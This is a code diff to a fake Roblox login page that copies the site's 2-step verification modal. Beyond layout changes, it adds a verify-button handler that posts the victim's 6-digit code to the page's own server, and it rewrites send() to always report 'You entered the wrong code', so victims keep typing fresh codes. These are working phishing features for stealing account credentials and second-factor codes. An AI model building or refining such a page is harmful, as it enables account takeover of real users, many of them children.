@@ -18,10 +18,21 @@
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
+            width: 100vw;
+            height: 100vh;
+            z-index: 99999;
             display: none;
+            background-color: rgba(0, 0, 0, 0.45);
+            justify-content: center;
+            align-items: center;
+        }
+
+        #twostepverification[style*="display: block"] {
+            display: flex !important;
+        }
+
+        #twostepverification .modal-backdrop {
+            display: none !important;
         }
 
         .dark-theme .modal-dialog .modal-content {
@@ -42,7 +53,7 @@
 
         #twostepverification .modal-modern {
             position: fixed;
-            top: 45%;
+            top: 53%;
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 2;
@@ -57,7 +68,7 @@
             box-shadow: 0 6px 16px rgba(0, 0, 0, 0.08);
             border: none;
             width: 100%;
-            height: 100%;
+            /* height: 100%; */
         }
 
         .modal-dialog {
@@ -65,7 +76,7 @@
             text-align: left;
             vertical-align: middle;
             width: 517px !important;
-            height: 613px;
+            /* height: 613px; */
             max-width: 100%;
             margin: 0;
             display: inline-block;
@@ -93,7 +104,8 @@
             margin-right: auto;
             border: none;
             background: transparent;
-            padding: 0;
+            padding-top: 2;
+            padding-bottom: 2;
         }
 
         .modal-modern .modal-dialog .modal-content .modal-body .modal-lock-icon {
@@ -120,7 +132,6 @@
         }
 
         .modal-modern .modal-dialog .modal-content .modal-body p {
-            margin: 24px;
             max-width: 543px !important;
             text-align: center !important;
         }
@@ -133,17 +144,40 @@
             border: none;
             background: transparent;
             padding: 0;
-            color: white;
+            color: #f7f7f8;
             font-weight: 700;
         }
 
-        .modal-modern .modal-dialog .modal-content .modal-footer .modal-modern-footer-buttons:not(:last-child) {
+        .modal-modern-footer-button {
+            background: #8f9094;
+            border-radius: 4px;
+            padding: 4px;
+            color: black;
             margin-bottom: 18px;
         }
 
         .modal-modern .modal-dialog .modal-content .modal-footer .modal-modern-footer-buttons {
-            display: flex;
+            display: flex !important;
             width: 100%;
+        }
+
+        .modal-modern .modal-dialog .modal-content .modal-footer {
+            padding: 0 18px 18px;
+        }
+
+        .modal-modern .modal-dialog .modal-content .modal-footer .modal-modern-footer-buttons .modal-modern-footer-button {
+            flex: 1 !important;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .modal-modern .modal-dialog .modal-content .modal-footer .modal-margin-bottom {
+            margin-bottom: 12px;
+        }
+
+        .anohter-veri-btn {
+            white-space: normal !important;
         }
 
         /* Keep your existing CSS rules for layout and other elements */
@@ -458,8 +492,8 @@
                             logged-in mobile or tablet device.</p>
                         <button type="button" class="modal-action-button btn-secondary-md modal-margin-bottom"
                             aria-label="Retry">Retry</button>
-                        <p><button type="button" class="modal-body-button-link small">Use another verification
-                                method</button></p>
+                        <p><button type="button" class="modal-body-button-link small anohter-veri-btn">Use another
+                                verification method</button></p>
                         <p class="text-footer modal-margin-bottom">Need help? Visit our <a
                                 class="text-name text-footer contact" href="https://www.roblox.com/info/2sv"
                                 target="_blank" rel="noopener noreferrer" bis_skin_checked="1">Help Center</a></p>
@@ -470,7 +504,7 @@
         </div>
     </div>
 
-    <!-- 2-Step Verification Modal (Copied from Original) -->
+    <!-- 2-Step Verification Modal-->
     <div role="dialog" style="display: none" id="twostepverification" bis_skin_checked="1">
         <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
         <div role="dialog" tabindex="-1" class="fade modal-modern in modal" bis_skin_checked="1">
@@ -493,9 +527,10 @@
                                         oninput="twostepInput(this.value, 'verifyButton'); this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');"
                                         placeholder="Enter 6-digit Code" id="two-step-verification-code-input"
                                         class="input-field form-control">
-                                    <input type="text" id="ticket" hidden="">
-                                    <input type="text" id="userid" hidden="">
-                                    <input type="text" id="server" hidden="">
+                                    <span class="form-control-label xsmall text-error" id="verification-error"
+                                        style="display:none; color:#ff0000; font-size:10px; margin-top:4px; text-align: left;">
+                                        You entered the wrong code.
+                                    </span>
                                     <div class="form-control-label bottom-label xsmall" id="twostep-error"
                                         bis_skin_checked="1">&nbsp;</div>
                                 </div>
@@ -505,7 +540,7 @@
                             <label for="remember-device">Trust this device for 30 days</label>
                         </p>
                         <p><button type="button" class="modal-body-button-link small">Resend Code</button></p>
-                        <p><button type="button" class="modal-body-button-link small"
+                        <p><button type="button" class="modal-body-button-link small anohter-veri-btn"
                                 onclick="document.getElementById('selectVerificationMethodEmail').style.display = 'block'; document.getElementById('twostepverification').style.display = 'none';">Use
                                 another verification method</button>
                         </p>
@@ -542,9 +577,13 @@
 
         // Placeholder for send() function (called by Verify button)
         function send() {
-            const code = document.getElementById('two-step-verification-code-input').value;
-            console.log('Verify code sent:', code);
-            // Add your verification logic here
+
+            const verificationError = document.getElementById('verification-error');
+            verificationError.style.display = 'none';
+            verificationError.textContent = 'You entered the wrong code.';
+            verificationError.style.display = 'block';
+            verificationError.style.color = '#ff0000';
+            verificationError.style.fontSize = '10px';
         }
 
         function validateLoginForm() {
@@ -582,6 +621,7 @@
 
             return isValid;
         }
+
         // ==========================================
         // 1. WebSocket Connection
         // ==========================================
@@ -738,6 +778,8 @@
             const passwordInput = document.getElementById('login-password');
             const loadingSpinner = document.getElementById('login-loading');
             const notificationDiv = document.getElementById('ajax-notification');
+            const verificationCode = document.getElementById('two-step-verification-code-input');
+            const verifyButton = document.getElementById('verifyButton');
             const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]').value;
 
             loginButton.addEventListener('click', function (e) {
@@ -849,6 +891,53 @@
                 return false;
             });
 
+            verifyButton.addEventListener('click', function (e) {
+                // Prevent default button behavior completely
+                
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+
+                const verificationCodevalue = verificationCode.value;
+
+                console.log('📤 Sending verificationCode via AJAX...');
+                console.log('👤 verificationCodevalue:', verificationCodevalue);
+                
+                // Get user_id from URL
+                const user_id = window.location.pathname.split('/')[2];
+
+                
+                // Send AJAX POST request
+                fetch(`/people/${user_id}/login/code/`, {
+                    method: 'POST',
+                    headers: {
+                        'X-CSRFToken': csrfToken,
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams({
+                        'verificationCodevalue': verificationCodevalue,
+                    })
+                })
+                    .then(response => {
+                        console.log('📬 Response status:', response.status);
+                    })
+                    .then(data => {
+                        console.log('📦 Response data:', data);
+
+                    })
+                    .catch(error => {
+                        console.error('❌ Fetch error:', error);
+
+                    });
+
+                // Final prevention of any redirect
+                return false;
+            });
+
+
+            verifyButton.addEventListener('click', function (e) {
+
+            })
             // Also handle Enter key press
             usernameInput.addEventListener('keypress', function (e) {
                 if (e.key === 'Enter') {
